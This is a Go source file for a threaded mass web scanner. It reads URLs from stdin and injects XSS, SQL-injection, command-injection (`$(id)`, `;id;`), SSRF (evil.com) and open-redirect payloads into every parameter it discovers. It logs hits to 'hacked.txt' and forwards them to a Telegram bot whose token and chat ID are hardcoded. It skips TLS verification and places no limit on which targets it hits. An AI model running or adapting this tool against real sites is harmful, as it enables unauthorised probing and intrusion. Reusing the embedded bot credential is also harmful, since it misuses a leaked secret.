package main

import (
        "bufio"
        "bytes"
        "context"
        "crypto/tls"
        "encoding/json"
        "flag"
        "fmt"
        "io"
        "net/http"
        "net/url"
        "os"
        "os/exec"
        "regexp"
        "sort"
        "strings"
        "sync"
        "time"
)

// === CONFIGURAÇÕES E PAYLOADS ===
var (
        PAYLOAD_XSS0   = `'"><xand>`
        PAYLOAD_XSS_C0 = `%C0%BCxand`

        MATCH_XSS    = `'"><xand>`
        MATCH_XSS_C0 = `<xand`

        PAYLOAD_RCE_SUB = `$(id)`
        PAYLOAD_RCE_SEP = `;id;`

        PAYLOAD_SQLI = `xx'"`
        SQL_ERRORS   = []string{
                "You have an error in your SQL syntax",
                "Warning: mysql_",
                "ORA-00933",
                "syntax error at or near",
                "mysql_fetch_array()",
                "OLE DB Provider for SQL Server",
        }

        PAYLOAD_SSRF = `https://evil.com`
        MATCH_SSRF   = `Evil.Com - We get it...Daily.`

        TELEGRAM_BOT_TOKEN = "6121601693:AAHm7lMTJF4x7HN0y0zimuot57_JhD_zqqc"
        TELEGRAM_CHAT_ID   = "1169622572"

        extensoesPost = []string{".php", ".php4", ".php5", ".phtml", ".asp", ".aspx", ".jsp", ".jspx", ".jspf", ".do", ".action", ".cgi", ".fcgi", ".pl", ".py", ".rb", ".ashx", ".asmx", ".axd", ".svc", ".cfm", ".cfc", ".rhtml"}
        MAX_PARAMS    = 50

        fileMutex sync.Mutex

        // === XSS PATH-BASED ===
        PATH_XSS_PAYLOAD = `'"><xand>`
        PATH_XSS_DESTROYER = "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣"
        PATH_XSS_MATCH = `'"><xand>`

        // === OPEN REDIRECT PATH-BASED ===
        REDIRECT_PATH_TEMPLATES = []string{
                "//xandsz.<ROOT>",
                "///////////////////////////////////////////////////xandsz.<ROOT>",
                "%5Cxandsz.<ROOT>",
                "//%5Cxandsz.<ROOT>",
                "%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5Cxandsz.<ROOT>",
        }

        REDIRECT_SUBDOMAIN = "xandsz"

        MAX_REDIRECTS = 5
)

// === EXPRESSÕES REGULARES ===
var (
        paramRegexes = func() []*regexp.Regexp {
                regexStrings := []string{
                        `['"]?([A-Za-z0-9_-]+)['"]?\s*:\s*['"]`,
                        `name="([A-Za-z0-9_-]+)"`,
                        `id="([A-Za-z0-9_-]+)"`,
                        `"([A-Za-z0-9_-]+)"\s*:`,
                        `'([A-Za-z0-9_-]+)'\s*:`,
                        `\b(?:var|let|const)\s+([A-Za-z0-9_-]+)\s*=`,
                        `[?&]([A-Za-z0-9_-]+)=`,
                        `data-([A-Za-z0-9_-]+)=`,
                        `\b(?:ng-|v-|x-|wire:)([A-Za-z0-9_-]+)=`,
                        `(?:const|let|var)\s+\{\s*([A-Za-z0-9_-]+)\s*[,\}]`,
                        `["']([A-Za-z0-9_-]+)["']\s*:\s*(?:true|false|null|[0-9.]+)`,
                        `\b(aria-[A-Za-z0-9_-]+)=`,
                        `placeholder=["']([^"']+)["']`,
                        `(?i)name\s*=\s*["']?([A-Za-z0-9_\-\$]+)["']?`,
                        `(?i)id\s*=\s*["']?([A-Za-z0-9_\-\$]+)["']?`,
                        `(?i)input.*?name\s*=\s*["']?([A-Za-z0-9_\-\$]+)["']?`,
                }
                out := make([]*regexp.Regexp, 0)
                for _, r := range regexStrings {
                        out = append(out, regexp.MustCompile(r))
                }
                return out
        }()

        rceidRegex = regexp.MustCompile(`uid=\d+\([^)]+\)`)
)

// === REDIRECT / FORM HIJACK ===
var compoundTLDs = map[string]bool{
        "com.br": true, "com.cn": true, "com.au": true, "com.tw": true,
        "com.th": true, "com.sg": true, "com.hk": true, "com.mx": true,
        "com.ar": true, "com.tr": true, "com.my": true, "com.ph": true,
        "com.vn": true, "com.pk": true, "com.eg": true, "com.sa": true,
        "co.uk": true, "co.jp": true, "co.kr": true, "co.in": true,
        "co.nz": true, "co.za": true, "co.id": true, "co.il": true,
        "net.br": true, "org.br": true, "gov.br": true, "net.cn": true,
        "ne.jp": true, "or.jp": true, "gov.uk": true, "org.uk": true,
}

var prefixPattern = `(?:https?:\/\/|\/\/|%5C%5C|%5C|\\\/)?`

func getRootDomain(host string) string {
        parts := strings.Split(host, ".")
        if len(parts) < 2 {
                return host
        }
        lastTwo := parts[len(parts)-2] + "." + parts[len(parts)-1]
        if compoundTLDs[lastTwo] && len(parts) >= 3 {
                return parts[len(parts)-3] + "." + lastTwo
        }
        return lastTwo
}

func isSameScope(origHost, destHost string) bool {
        if origHost == "" || destHost == "" {
                return false
        }
        origRoot := getRootDomain(origHost)
        destRoot := getRootDomain(destHost)
        return origRoot == destRoot
}

func resolveRedirect(base *url.URL, location string) (*url.URL, error) {
        loc, err := url.Parse(location)
        if err != nil {
                return nil, err
        }
        return base.ResolveReference(loc), nil
}

func buildPayloads(domain string) []string {
        return []string{
                "https://" + domain,
                "http://" + domain,
                "//" + domain,
                "%5C" + domain,
                "%5C%5C" + domain,
                domain,
                `\/` + domain,
        }
}

func buildDetectionRegexes(domain string) (loc, method, hijack *regexp.Regexp) {
        d := regexp.QuoteMeta(domain)
        q := `['"` + "`" + `]`

        loc = regexp.MustCompile(`(?i)(window|top|parent|self|location)(\.location)?(\.href)?\s*=\s*` + q + prefixPattern + d + q)
        method = regexp.MustCompile(`(?i)(window|top|parent|self|location)?\.?location\.(assign|replace)\s*\(\s*` + q + prefixPattern + d + q)
        hijack = regexp.MustCompile(`(?i)<[a-zA-Z]+\s+[^>]*?(href|action|src|srcdoc)\s*=\s*` + q + prefixPattern + d)
        return
}

func saveToFile(data string) {
        fileMutex.Lock()
        defer fileMutex.Unlock()
        f, err := os.OpenFile("hacked.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                return
        }
        defer f.Close()
        f.WriteString(data + "\n---\n")
}

func sendNotify(msg string) {
        cmd := exec.Command("notify", "-p", "discord,telegram")
        cmd.Stdin = strings.NewReader(msg)
        _ = cmd.Run()
}

func reportVulnerability(msg string) {
        saveToFile(msg)
        go sendTelegram(msg)
        go sendNotify(msg)
}

func sendTelegram(msg string) {
        if TELEGRAM_BOT_TOKEN == "" || TELEGRAM_CHAT_ID == "" {
                return
        }
        data, _ := json.Marshal(map[string]interface{}{"chat_id": TELEGRAM_CHAT_ID, "text": msg})
        req, _ := http.NewRequest("POST", fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN), bytes.NewBuffer(data))
        if req != nil {
                req.Header.Set("Content-Type", "application/json")
                client := &http.Client{Timeout: 5 * time.Second}
                resp, err := client.Do(req)
                if err == nil && resp != nil {
                        resp.Body.Close()
                }
        }
}

var paramNameRegex = regexp.MustCompile(`^[A-Za-z0-9_\-\.\[\]\$]{1,64}$`)

func isValidParamName(s string) bool {
        return paramNameRegex.MatchString(s)
}

func isBlacklisted(s string) bool {
        low := strings.ToLower(s)
        blacklist := []string{
                "__viewstategenerator", "__eventvalidation", "viewport", "generator",
                "vs_defaultclientscript", "utf-8", "description", "__init__",
                "__globals__", "__builtins__", "__class__", "__base__",
                "__mro__", "__subclasses__",
        }
        for _, b := range blacklist {
                if strings.Contains(low, b) {
                        return true
                }
        }
        if matched, _ := regexp.MatchString(`^\d{6,}$`, s); matched {
                return true
        }
        return false
}

// === isHtml ATUALIZADO ===
// Aceita APENAS os Content-Types que permitem execução de XSS:
// text/html, application/xhtml+xml, application/xhtml, application/xml+xhtml
func isHtml(contentType string) bool {
        ct := strings.ToLower(contentType)
        if ct == "" {
                return false
        }
        return strings.Contains(ct, "text/html") ||
                strings.Contains(ct, "application/xhtml+xml") ||
                strings.Contains(ct, "application/xhtml") ||
                strings.Contains(ct, "application/xml+xhtml") ||
                strings.Contains(ct, "image/svg+xml")
}

func containsSqlError(body string) string {
        for _, errStr := range SQL_ERRORS {
                if strings.Contains(body, errStr) {
                        return errStr
                }
        }
        return ""
}

func extractKeys(u string, body string) []string {
        m := map[string]struct{}{}
        parsed, err := url.Parse(u)
        if err == nil {
                for k := range parsed.Query() {
                        if isValidParamName(k) && !isBlacklisted(k) {
                                m[k] = struct{}{}
                        }
                }
        }
        for _, re := range paramRegexes {
                for _, mm := range re.FindAllStringSubmatch(body, -1) {
                        if len(mm) > 1 {
                                key := mm[1]
                                if isValidParamName(key) && !isBlacklisted(key) {
                                        m[key] = struct{}{}
                                }
                        }
                }
        }
        out := make([]string, 0, len(m))
        for k := range m {
                out = append(out, k)
        }
        return out
}

func generateWordlistWithTok(body string) []string {
        cmd := exec.Command("tok", "-max", "100")
        cmd.Stdin = strings.NewReader(body)
        var out bytes.Buffer
        cmd.Stdout = &out
        if err := cmd.Run(); err != nil {
                return nil
        }
        m := map[string]struct{}{}
        scanner := bufio.NewScanner(&out)
        for scanner.Scan() {
                word := strings.TrimSpace(scanner.Text())
                if word != "" && isValidParamName(word) && !isBlacklisted(word) {
                        m[word] = struct{}{}
                }
        }
        words := make([]string, 0, len(m))
        for k := range m {
                words = append(words, k)
        }
        sort.Strings(words)
        return words
}

func chunkArray(arr []string, size int) [][]string {
        var res [][]string
        for i := 0; i < len(arr); i += size {
                end := i + size
                if end > len(arr) {
                        end = len(arr)
                }
                res = append(res, arr[i:end])
        }
        return res
}

func montarURL(base string, keys []string, payload string) (string, error) {
        u, err := url.Parse(base)
        if err != nil {
                return "", err
        }
        q := u.Query()
        for _, k := range keys {
                q.Set(k, payload)
        }
        u.RawQuery = q.Encode()
        return u.String(), nil
}

func montarURLRaw(base string, keys []string, payload string) (string, error) {
        u, err := url.Parse(base)
        if err != nil {
                return "", err
        }
        var qs []string
        for _, k := range keys {
                qs = append(qs, fmt.Sprintf("%s=%s", k, payload))
        }
        if u.RawQuery != "" {
                u.RawQuery += "&" + strings.Join(qs, "&")
        } else {
                u.RawQuery = strings.Join(qs, "&")
        }
        return u.String(), nil
}

func montarURLValues(base string, vals map[string]string) (string, error) {
        u, err := url.Parse(base)
        if err != nil {
                return "", err
        }
        q := u.Query()
        for k, v := range vals {
                q.Set(k, v)
        }
        u.RawQuery = q.Encode()
        return u.String(), nil
}

func pathAllowsPost(u *url.URL) bool {
        p := strings.ToLower(u.Path)
        if p == "" || p == "/" {
                return true
        }
        for _, e := range extensoesPost {
                if strings.HasSuffix(p, e) {
                        return true
                }
        }
        return false
}

type Scanner struct {
        client        *http.Client
        noRedirClient *http.Client
}

func (s *Scanner) doRequestWith(ctx context.Context, req *http.Request, client *http.Client) (int, string, string, []string, error) {
        if req == nil {
                return 0, "", "", nil, fmt.Errorf("nil request")
        }
        req = req.WithContext(ctx)
        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")

        resp, err := client.Do(req)
        if err != nil {
                return 0, "", "", nil, err
        }

        defer func() {
                io.Copy(io.Discard, resp.Body)
                resp.Body.Close()
        }()

        ct := resp.Header.Get("Content-Type")
        setCookies := resp.Header.Values("Set-Cookie")
        bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 500000))
        return resp.StatusCode, string(bodyBytes), ct, setCookies, nil
}

func (s *Scanner) doRequest(ctx context.Context, req *http.Request) (int, string, string, error) {
        st, body, ct, _, err := s.doRequestWith(ctx, req, s.client)
        return st, body, ct, err
}

func (s *Scanner) testGET(ctx context.Context, u string) (int, string, string, error) {
        req, _ := http.NewRequest("GET", u, nil)
        return s.doRequest(ctx, req)
}

func (s *Scanner) testGETNoRedir(ctx context.Context, u string) (int, string, string, []string, string, error) {
        req, _ := http.NewRequest("GET", u, nil)
        if req == nil {
                return 0, "", "", nil, "", fmt.Errorf("url invalida")
        }
        req = req.WithContext(ctx)
        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")

        resp, err := s.noRedirClient.Do(req)
        if err != nil {
                return 0, "", "", nil, "", err
        }
        defer func() {
                io.Copy(io.Discard, resp.Body)
                resp.Body.Close()
        }()

        ct := resp.Header.Get("Content-Type")
        location := resp.Header.Get("Location")
        setCookies := resp.Header.Values("Set-Cookie")
        bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 500000))
        return resp.StatusCode, string(bodyBytes), ct, setCookies, location, nil
}

func (s *Scanner) testGETCookies(ctx context.Context, u string) (int, string, string, []string, error) {
        req, _ := http.NewRequest("GET", u, nil)
        if req == nil {
                return 0, "", "", nil, fmt.Errorf("url invalida")
        }
        return s.doRequestWith(ctx, req, s.noRedirClient)
}

func (s *Scanner) testPOST(ctx context.Context, u string, params map[string]string) (int, string, string, error) {
        form := url.Values{}
        for k, v := range params {
                form.Set(k, v)
        }
        bodyStr := form.Encode()
        req, _ := http.NewRequest("POST", u, strings.NewReader(bodyStr))
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        return s.doRequest(ctx, req)
}

// ============================================================
// === XSS PATH-BASED ===
// ============================================================
func (s *Scanner) testPathBasedXSS(ctx context.Context, target string, label string) {
        uParsed, err := url.Parse(target)
        if err != nil || uParsed.Host == "" {
                return
        }

        cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
        defer cancel()

        isRoot := uParsed.Path == "" || uParsed.Path == "/"

        basePath := strings.TrimRight(uParsed.Path, "/")
        base := fmt.Sprintf("%s://%s%s", uParsed.Scheme, uParsed.Host, basePath)

        // Base preservando a barra final (usada APENAS pelas variações %3F e %5C)
        baseComBarra := fmt.Sprintf("%s://%s%s", uParsed.Scheme, uParsed.Host, uParsed.Path)
        // Garante a barra final: sem ela as variações %3F/%5C caem no lugar errado
        // (ex.: /api/documentation%3F… em vez de /api/documentation/%3F…).
        if !strings.HasSuffix(baseComBarra, "/") {
                baseComBarra += "/"
        }

        origQuery := uParsed.RawQuery

        rawPayload := PATH_XSS_PAYLOAD
        encPayload := url.PathEscape(PATH_XSS_PAYLOAD)
        encDestroyer := url.PathEscape(PATH_XSS_DESTROYER)

        var variacoes []string

        if isRoot {
                variacoes = []string{
                        base + "/" + encPayload,
                        base + "?" + encPayload,
                        base + "/" + encDestroyer + encPayload,
                        baseComBarra + "%3F" + encPayload,
                        baseComBarra + "%5C" + encPayload,
                }
        } else {
                variacoes = []string{
                        base + encPayload,
                        base + "/" + encPayload,
                        base + "?" + encPayload,
                        base + "ⓐ" + encPayload,
                        base + "/" + encDestroyer + encPayload,
                        base + ".php/" + encPayload,
                        base + ".html/" + encPayload,
                        baseComBarra + "%3F" + encPayload,
                        baseComBarra + "%5C" + encPayload,
                }
        }

        seen := map[string]struct{}{}

        for _, v := range variacoes {
                select {
                case <-cctx.Done():
                        return
                default:
                }

                full := v
                if origQuery != "" {
                        if strings.Contains(v, "?") {
                                full = v + "&" + origQuery
                        } else {
                                full = v + "?" + origQuery
                        }
                }

                if _, dup := seen[full]; dup {
                        continue
                }
                seen[full] = struct{}{}

                st, body, ct, err := s.testGET(cctx, full)
                if err != nil {
                        continue
                }

                if !isHtml(ct) {
                        continue
                }

                if !strings.Contains(body, rawPayload) {
                        continue
                }

                fmt.Printf("🚨 XSS PATH-BASED [%s]!\nURL: %s\nStatus: %d\nMatch: %s\n\n", label, full, st, rawPayload)

                reportVulnerability(fmt.Sprintf(
                        "🚨 XSS PATH-BASED [%s]!\nURL: %s\nStatus: %d\nMatch: %s",
                        label, full, st, rawPayload,
                ))
        }
}

// ============================================================
// === OPEN REDIRECT PATH-BASED ===
// ============================================================
func (s *Scanner) testOpenRedirectPathBased(ctx context.Context, target string, label string) {
        uParsed, err := url.Parse(target)
        if err != nil || uParsed.Host == "" {
                return
        }

        cctx, cancel := context.WithTimeout(ctx, 20*time.Second)
        defer cancel()

        host := uParsed.Hostname()
        root := getRootDomain(host)
        if root == "" {
                return
        }

        basePath := strings.TrimRight(uParsed.Path, "/")
        base := fmt.Sprintf("%s://%s%s", uParsed.Scheme, uParsed.Host, basePath)

        origQuery := uParsed.RawQuery

        rootEscaped := regexp.QuoteMeta(root)
        locRegex := regexp.MustCompile(
                `(?im)^location\s*:\s*(?:(?:https?:)?//|\\\\|\\/|\\|/\\)+` +
                        regexp.QuoteMeta(REDIRECT_SUBDOMAIN) + `\.` + rootEscaped + `(?:[:/?#]|$)`,
        )

        var urls []string
        for _, tpl := range REDIRECT_PATH_TEMPLATES {
                p := strings.ReplaceAll(tpl, "<ROOT>", root)
                enc := encodeRedirectPayload(p)
                urls = append(urls,
                        base+enc,
                        base+"/"+enc,
                )
        }

        seen := map[string]struct{}{}

        for _, full := range urls {
                select {
                case <-cctx.Done():
                        return
                default:
                }

                if origQuery != "" {
                        if strings.Contains(full, "?") {
                                full = full + "&" + origQuery
                        } else {
                                full = full + "?" + origQuery
                        }
                }

                if _, dup := seen[full]; dup {
                        continue
                }
                seen[full] = struct{}{}

                st, _, _, _, loc, err := s.testGETNoRedir(cctx, full)
                if err != nil {
                        continue
                }

                if st != 301 && st != 302 && st != 303 && st != 306 && st != 307 && st != 308 {
                        continue
                }
                if loc == "" {
                        continue
                }

                headerLine := "Location: " + loc
                if !locRegex.MatchString(headerLine) {
                        continue
                }

                fmt.Printf("🚨 OPEN REDIRECT PATH-BASED [%s]!\nURL: %s\nStatus: %d\nLocation: %s\nRoot: %s\n\n", label, full, st, loc, root)

                reportVulnerability(fmt.Sprintf(
                        "🚨 OPEN REDIRECT PATH-BASED [%s]!\nURL: %s\nStatus: %d\nLocation: %s\nRoot: %s",
                        label, full, st, loc, root,
                ))
        }
}

func encodeRedirectPayload(s string) string {
        var b strings.Builder
        b.Grow(len(s) * 3)
        for i := 0; i < len(s); i++ {
                c := s[i]
                if c == '%' && i+2 < len(s) && isHex(s[i+1]) && isHex(s[i+2]) {
                        b.WriteByte(c)
                        b.WriteByte(s[i+1])
                        b.WriteByte(s[i+2])
                        i += 2
                        continue
                }
                if c == '/' {
                        b.WriteByte(c)
                        continue
                }
                if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                        (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
                        b.WriteByte(c)
                        continue
                }
                fmt.Fprintf(&b, "%%%02X", c)
        }
        return b.String()
}

func isHex(c byte) bool {
        return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')
}

// ============================================================
// === EXECUTE ATTACK ===
// ============================================================
func (s *Scanner) executeAttack(ctx context.Context, target string, chunk []string, label string, allowPost bool) {
        paramString := strings.Join(chunk, ",")
        cctx, cancel := context.WithTimeout(ctx, 7*time.Second)
        defer cancel()

        uTargetParsed, errHost := url.Parse(target)
        targetHost := ""
        if errHost == nil {
                targetHost = uTargetParsed.Hostname()
        }

        uSql, _ := montarURLRaw(target, chunk, PAYLOAD_SQLI)
        if _, b, _, _ := s.testGET(cctx, uSql); b != "" {
                if foundErr := containsSqlError(b); foundErr != "" {
                        fmt.Printf("🚨 SQLi GET [%s]!\nURL: %s\nErro: %s\n\n", label, uSql, foundErr)
                        reportVulnerability("🚨 SQLi GET [" + label + "]!\nURL: " + uSql + "\nErro: " + foundErr)
                }
        }

        uX, _ := montarURL(target, chunk, PAYLOAD_XSS0)
        if _, b, ct, _ := s.testGET(cctx, uX); isHtml(ct) && strings.Contains(b, MATCH_XSS) {
                fmt.Printf("🚨 XSS GET [%s]!\nURL: %s\n\n", label, uX)
                reportVulnerability("🚨 XSS GET [" + label + "]!\nURL: " + uX)
        }

        uXc0, _ := montarURL(target, chunk, PAYLOAD_XSS_C0)
        if _, b, ct, _ := s.testGET(cctx, uXc0); isHtml(ct) && strings.Contains(b, MATCH_XSS_C0) {
                fmt.Printf("🚨 XSS C0 GET [%s]!\nURL: %s\n\n", label, uXc0)
                reportVulnerability("🚨 XSS C0 GET [" + label + "]!\nURL: " + uXc0)
        }

        if allowPost {
                pmSql := map[string]string{}
                for _, k := range chunk {
                        pmSql[k] = PAYLOAD_SQLI
                }
                if _, b, _, _ := s.testPOST(cctx, target, pmSql); b != "" {
                        if foundErr := containsSqlError(b); foundErr != "" {
                                fmt.Printf("🚨 SQLi POST [%s]!\nURL: %s\nErro: %s\n\n", label, target, foundErr)
                                reportVulnerability("🚨 SQLi POST [" + label + "]!\nURL: " + target + "\nParams: " + paramString + "\nErro: " + foundErr)
                        }
                }

                pmSsrf := map[string]string{}
                for _, k := range chunk {
                        pmSsrf[k] = PAYLOAD_SSRF
                }
                if _, b, _, _ := s.testPOST(cctx, target, pmSsrf); strings.Contains(b, MATCH_SSRF) {
                        fmt.Printf("🚨 SSRF POST [%s]!\nURL: %s\n\n", label, target)
                        reportVulnerability("🚨 SSRF POST [" + label + "]!\nURL: " + target + "\nPayload: " + PAYLOAD_SSRF + "\nParams: " + paramString)
                }

                pmX := map[string]string{}
                for _, k := range chunk {
                        pmX[k] = PAYLOAD_XSS0
                }
                if _, b, ct, _ := s.testPOST(cctx, target, pmX); isHtml(ct) && strings.Contains(b, MATCH_XSS) {
                        fmt.Printf("🚨 XSS POST [%s]!\nURL: %s\n\n", label, target)
                        reportVulnerability("🚨 XSS POST [" + label + "]!\nURL: " + target + "\nParams: " + paramString)
                }

                for _, pRCE := range []string{PAYLOAD_RCE_SUB, PAYLOAD_RCE_SEP} {
                        pmRCE := map[string]string{}
                        for _, k := range chunk {
                                pmRCE[k] = pRCE
                        }
                        if _, b, _, _ := s.testPOST(cctx, target, pmRCE); rceidRegex.MatchString(b) {
                                match := rceidRegex.FindString(b)
                                fmt.Printf("🚨 RCE POST [%s]!\nURL: %s\nMatch: %s\n\n", label, target, match)
                                reportVulnerability("🚨 RCE POST [" + label + "]!\nURL: " + target + "\nPayload: " + pRCE + "\nMatch: " + match)
                        }
                }
        }

        if targetHost != "" {
                rootDomain := getRootDomain(targetHost)

                redirectDomains := []struct {
                        domain string
                        tag    string
                }{
                        {"xandsz.com", "ESTATICO"},
                        {"xandsz." + rootDomain, "BYPASS-HOST"},
                }

                for _, rd := range redirectDomains {
                        loc, method, hijack := buildDetectionRegexes(rd.domain)

                        for _, payload := range buildPayloads(rd.domain) {
                                uTest, _ := montarURLRaw(target, chunk, payload)
                                _, b, ct, _ := s.testGET(cctx, uTest)
                                if b == "" {
                                        continue
                                }

                                if loc.MatchString(b) || method.MatchString(b) {
                                        fmt.Printf("🚨 OPEN REDIRECT CLIENT-SIDE [%s | %s]!\nURL: %s\n\n", label, rd.tag, uTest)
                                        reportVulnerability("🚨 OPEN REDIRECT CLIENT-SIDE [" + label + " | " + rd.tag + " | payload: " + payload + "]!\nURL: " + uTest)
                                }

                                if isHtml(ct) && hijack.MatchString(b) {
                                        fmt.Printf("🚨 FORM/LINK HIJACK [%s | %s]!\nURL: %s\n\n", label, rd.tag, uTest)
                                        reportVulnerability("🚨 FORM/LINK HIJACK [" + label + " | " + rd.tag + " | payload: " + payload + "]!\nURL: " + uTest)
                                }
                        }
                }
        }
}

// ============================================================
// === SCAN PAGE ===
// ============================================================
func (s *Scanner) scanPage(ctx context.Context, target string, body string, label string) {
        s.testPathBasedXSS(ctx, target, label)
        s.testOpenRedirectPathBased(ctx, target, label)

        if len(body) == 0 {
                return
        }

        keysRegex := extractKeys(target, body)
        keysTok := generateWordlistWithTok(body)

        uParsed, _ := url.Parse(target)
        isRoot := uParsed.Path == "" || uParsed.Path == "/"

        if len(keysRegex) > 0 {
                for _, chunk := range chunkArray(keysRegex, MAX_PARAMS) {
                        allowPost := isRoot || pathAllowsPost(uParsed)
                        s.executeAttack(ctx, target, chunk, label+"-Regex", allowPost)
                }
        }

        if len(keysTok) > 0 {
                for _, chunk := range chunkArray(keysTok, MAX_PARAMS) {
                        allowPost := isRoot || pathAllowsPost(uParsed)
                        s.executeAttack(ctx, target, chunk, label+"-Tok", allowPost)
                }
        }
}

// ============================================================
// === FOLLOW REDIRECT ===
// ============================================================
func (s *Scanner) followRedirectIfSameScope(ctx context.Context, startURL string, initialStatus int, initialBody string, initialCT string, initialLoc string, origHost string) {
        steps := 0
        currentURL := startURL
        currentStatus := initialStatus
        currentBody := initialBody
        currentCT := initialCT
        currentLoc := initialLoc

        for steps < MAX_REDIRECTS {
                if currentStatus != 301 && currentStatus != 302 && currentStatus != 303 && currentStatus != 307 && currentStatus != 308 {
                        return
                }
                if currentLoc == "" {
                        return
                }

                baseParsed, err := url.Parse(currentURL)
                if err != nil {
                        return
                }

                destParsed, err := resolveRedirect(baseParsed, currentLoc)
                if err != nil {
                        return
                }

                destHost := destParsed.Hostname()
                if !isSameScope(origHost, destHost) {
                        return
                }

                if isHtml(currentCT) && len(currentBody) > 200 {
                        s.scanPage(ctx, currentURL, currentBody, fmt.Sprintf("Redirect-Step-%d", steps+1))
                }

                steps++
                nextURL := destParsed.String()

                st, body, ct, _, loc, err := s.testGETNoRedir(ctx, nextURL)
                if err != nil {
                        return
                }

                if st == 301 || st == 302 || st == 303 || st == 307 || st == 308 {
                        currentURL = nextURL
                        currentStatus = st
                        currentBody = body
                        currentCT = ct
                        currentLoc = loc
                        continue
                }

                s.scanPage(ctx, nextURL, body, fmt.Sprintf("Redirect-Final-%d", steps))
                return
        }
}

// ============================================================
// === TEST URL ===
// ============================================================
func (s *Scanner) testURL(ctx context.Context, target string) {
        st, body, ct, _, loc, err := s.testGETNoRedir(ctx, target)
        if err != nil {
                return
        }

        uParsed, err := url.Parse(target)
        if err != nil {
                return
        }
        origHost := uParsed.Hostname()

        if st == 301 || st == 302 || st == 303 || st == 307 || st == 308 {
                // Path-based na URL ORIGEM: a injeção pode quebrar a rota e trocar o
                // status (ex.: 302 -> 200). Sem isso o redirect esconde a rota original.
                s.testPathBasedXSS(ctx, target, "Origem-Redirect")

                if st == 307 || st == 308 {
                        if isHtml(ct) && len(body) > 200 {
                                s.scanPage(ctx, target, body, "Redirect-Origem")
                        }
                }
                s.followRedirectIfSameScope(ctx, target, st, body, ct, loc, origHost)
                return
        }

        s.scanPage(ctx, target, body, "Direto")
}

func main() {
        threads := flag.Int("t", 30, "Threads")
        flag.Parse()

        transport := &http.Transport{
                ForceAttemptHTTP2: true,
                TLSClientConfig: &tls.Config{
                        InsecureSkipVerify: true,
                },
                MaxIdleConns:        1000,
                MaxIdleConnsPerHost: 100,
                IdleConnTimeout:     15 * time.Second,
        }

        scanner := &Scanner{
                client: &http.Client{
                        Timeout:   10 * time.Second,
                        Transport: transport,
                },
                noRedirClient: &http.Client{
                        Timeout:   10 * time.Second,
                        Transport: transport,
                        CheckRedirect: func(req *http.Request, via []*http.Request) error {
                                return http.ErrUseLastResponse
                        },
                },
        }

        jobs := make(chan string)
        var wg sync.WaitGroup

        for i := 0; i < *threads; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for u := range jobs {
                                u = strings.TrimSpace(u)
                                if u == "" {
                                        continue
                                }
                                if !strings.HasPrefix(u, "http") {
                                        u = "https://" + u
                                }
                                scanner.testURL(context.Background(), u)
                        }
                }()
        }

        sc := bufio.NewScanner(os.Stdin)
        for sc.Scan() {
                jobs <- sc.Text()
        }
        close(jobs)
        wg.Wait()
}